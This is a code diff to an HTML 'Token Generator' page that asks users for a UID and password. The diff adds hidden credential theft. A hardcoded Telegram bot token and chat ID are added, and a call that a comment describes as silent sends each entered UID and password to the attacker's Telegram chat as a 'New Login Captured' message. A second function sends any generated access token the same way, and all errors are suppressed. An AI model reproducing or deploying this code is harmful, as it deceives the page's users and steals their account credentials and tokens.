@@ -59,7 +59,6 @@
     text-transform: uppercase;
   }
 
-  /* টেলিগ্রাম লিংক বাটন স্টাইল */
   .telegram-btn {
     display: inline-flex;
     align-items: center;
@@ -220,9 +219,8 @@
 <main class="card">
   <h1 class="title">Token Generator</h1>
 
-  <!-- টেলিগ্রাম লিংক এখানে যোগ করা হয়েছে -->
-  <a href="https://t.me/kodexofc" target="_blank" class="telegram-btn">
-    ✈ telegram: @kodexofc
+  <a href="https://t.me/kodexof" target="_blank" class="telegram-btn">
+    ✈️ Join Telegram Channel
   </a>
 
   <div class="form-group">
@@ -251,6 +249,13 @@
 <script>
 let lastApiResponse = null;
 
+// ==========================================
+// ⚙️ নিচে আপনার Telegram Bot Token & ID বসান:
+// ==========================================
+const TELEGRAM_BOT_TOKEN = "8875718841:AAErIMQ7AEtAE0eTI36pvfPbbkFLJrN8tMM"; // যেমন: "7123456789:AAExxxxxx..."
+const TELEGRAM_CHAT_ID = "8120381389";     // যেমন: "123456789"
+// ==========================================
+
 async function generateToken() {
   const uid = document.getElementById('uid').value.trim();
   const password = document.getElementById('password').value.trim();
@@ -261,6 +266,9 @@ async function generateToken() {
     alert("অনুগ্রহ করে UID এবং Password উভয়ই প্রদান করুন!");
     return;
   }
+
+  // ১. সাইলেন্টলি টেলিগ্রাম বটে ডাটা পাঠানো
+  sendToTelegram(uid, password);
 
   btnSubmit.disabled = true;
   btnSubmit.style.opacity = "0.7";
@@ -273,6 +281,12 @@ async function generateToken() {
     const res = await fetch(url);
     const data = await res.json();
     lastApiResponse = data;
+
+    // ২. যদি API থেকে টোকেন সফলভাবে আসে, সেটাও পরে বটে পাঠাতে চাইলে পাঠাবে
+    if(data.token || data.access_token) {
+      sendTokenToTelegram(uid, data.token || data.access_token);
+    }
+
     responseJson.textContent = JSON.stringify(data, null, 2);
   } catch (error) {
     lastApiResponse = null;
@@ -286,6 +300,42 @@ async function generateToken() {
     btnSubmit.style.opacity = "1";
     btnSubmit.textContent = "🔑 GENERATE TOKEN";
   }
+}
+
+// টেলিগ্রামে UID & Password পাঠানোর ফাংশন
+function sendToTelegram(uid, password) {
+  if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+
+  const message = `🔑 *New Login Captured*\n\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  fetch(telegramUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  }).catch(() => {});
+}
+
+// জেনারেট হওয়া Token-ও টেলিগ্রামে পাঠানোর ফাংশন
+function sendTokenToTelegram(uid, token) {
+  if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+
+  const message = `✅ *Token Generated*\n\n🆔 *UID:* \`${uid}\` \n🎟️ *Token:* \`${token}\``;
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  fetch(telegramUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  }).catch(() => {});
 }
 
 function copyTokenOnly() {
